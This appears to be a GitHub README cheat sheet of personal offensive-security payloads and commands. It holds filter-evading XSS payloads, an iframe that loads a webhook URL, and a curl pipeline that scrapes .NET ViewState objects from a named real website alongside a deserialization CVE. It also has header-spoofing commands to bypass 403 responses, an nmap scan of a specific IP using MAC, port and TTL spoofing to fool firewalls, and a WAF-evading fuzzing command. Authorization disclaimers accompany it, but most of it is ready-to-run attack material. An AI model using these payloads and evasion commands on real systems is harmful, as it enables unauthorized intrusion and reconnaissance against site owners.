<br>
<h1 align="center"> Offensive Security MISC Anotations and Payloads</h1> <br>

<br>
<br>


# XSS
- Personally created XSS payloads <br>

<br>

## ⚠️ Danger zone! ⚠️ <br>
> Danger zone is the area which the payloads can be OR will be harmfull to a web application. <br>
> So, do no use them unless you're sure the web app will not be damaged or you're testing on a allowed enviroment! <br>
> I do NOT take any responsability to any of you who wants to test on random websites. You have been warned!

<br>

> Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
> to any person who decide to execute those on random places, you have been warned!

## Payloads <br>

```html
</script><svg><script/class=rodric>alert(1)</script>-%26apos;
</SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
""><svg/onload=alert(1)>%27/---+{{77}}"
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
```

<br>

<hr>

<br>

# SSRF
- Personally created SSRF payloads <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/YOUR_HOOK"></iframe>
```

<br>

<hr>

<br>

# cURL .NET Serialized object grabber
- [cURL](https://linux.die.net/man/1/curl) is a tool to transfer data from or to a server.
- .NET Deserialization ([CVE-2019-18935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935))

### Grep for __VIEWSTATE parameters in a determined url <br>

```bash
curl -v -s -k https://www.nepalipaisa.com/News.aspx | grep VIEW >> arquivo.txt
```

### Grabbing only the objects on the output file & throwing the objects into stdout <br>

```bash
cat arquivo.txt | awk -v value="[OBJECT]>>> " '{print value$5}' | tr -d value=\" | awk '{print $2}' | sed 'G'
```

<br>

<hr>

<br>

# cURL Bypass 403 Redirect
- [cURL](https://linux.die.net/man/1/curl) is a tool to transfer data from or to a server.

```bash
curl -s -k -X GET https://www.site.com/ -v -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -H "User-Agent: GoogleBot" -H "Content-Length:0"

curl -i -s -k -X GET https://www.site.com/ -H "Host: www.site.co" -H "X-rewrite-url: directory"
```

<br>

<hr>

<br>

# Tools

# Nmap Ultimate Scan v1 ([man](https://man7.org/linux/man-pages/man1/nmap.1.html))
- Nmap is a network discovery and security auditing.
- It can also be used for web application.
- Replace the API-KEY with your [Shodan](https://www.shodan.io) API Key

```sh
sudo nmap --randomize-hosts -Pn 185.28.21.231 --script shodan-api --script-args shodan-api.apikey=API-KEY -v -sS --open --reason --ttl=128 -sV --top-ports=20 --min-rate=2000 -T3  --spoof-mac=google -g443 --script="not intrusive" -oN resultados.txt
```

### Explanation:
```markdown
--randomize-hosts        :: Tells Nmap to shuffle each group of up to 16384 hosts before it scans them.
-Pn                      :: Skips the host discovery stage altogether.
--script *               :: Invoking the script to Shodan API.
-v                       :: Verbose mode.
-sS                      :: TCP SYN scan.
--open                   :: Show open ports.
--reason                 :: Shows the reason each port is set to a specific state and the reason each host is up or down.
--ttl=128                :: Tricks the Target/Firewalls of thinking the user is scanning using Windows OS.
-sV                      :: -sS added with -sV means that in case a port doesn't respond with SYN/ACK, Nmap will close the conection with RST.
--top-ports=20           :: Scan 20 most common ports (Can be set to any number).
--min-rate=2000          :: Send packets no slower than 2000 per second.
-T3                      :: Timing template set to polite.
--spoof-mac=google       :: Spoof MAC address.
-g443                    :: Spoof source port number.
--script="not intrusive" :: Loads every script except for those in the intrusive category.
-oN                      :: Output the results to a file named resultados.txt
```

<br>

# wFuzz ([man](https://www.kali.org/tools/wfuzz/))
- wFuzz is a web application fuzzing tool <br>

<br>

###  Ultimate wFuzz command v1 <br>
- You can find awesome wordlists [here](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

```sh
sudo wfuzz --hc 404,400,302,301 -u https://site.com/FUZZ -w WORDLIST.txt -H "User-Agent: Googlebot-News" -t 50
```

### Explanation:
```markdown
--hc                     :: Ignore 404, 400, 302 and 301 status codes.
-u                       :: Url with the FUZZ param where the program shall do the fuzzing.
-w                       :: Using a wordlist.
-H                       :: Trying to trick the WAF with a Google-bot user agent.
-t                       :: Using 50 threads.
```

<br>

<hr>

<br>

# APIs
- Apis for any kinds of target reconnaissance.
- Can be also used with cURL for automatic tool making
- Switch the URL with your target's domain or ip.

<br>

## DNS Look up <br>

> https://api.hackertarget.com/dnslookup/?q=URL <br>
> https://api.threatminer.org/v2/domain.php?q=URL&rt=5

<br>

## HTTP Headers <br>

> https://api.hackertarget.com/httpheaders/?q=URL

<br>

## Host Search & Sub-domains <br>

> https://api.hackertarget.com/hostsearch/?q=URL
> https://sonar.omnisint.io/subdomains/URL
> https://jldc.me/anubis/subdomains/URL

<br>

## Crawlers <br>
- Alien Vault limit parameter can be set to any integer number,
- as well as the page parameter.
- Common Crawl outputs with json format.

> https://otx.alienvault.com/api/v1/indicators/hostname/URL/url_list?limit=50&page=1 <br>
> https://index.commoncrawl.org/CC-MAIN-2021-43-index?url=URL&output=json

<br>
<br>
<br>
<br>
<hr>


#### Credits: <br>

> [Me](https://github.com/rodricbr)               :: Creator of this directory and most of the payloads/commands

> [NobodyKnows](https://github.com/almostfamous2) :: Base creator of the [Nmap command](#nmap-ultimate-scan-v1-man)

> [Me](https://github.com/rodricbr)               :: Creator of the [cURL .NET command](#curl-net-deserialization-object-grabber)


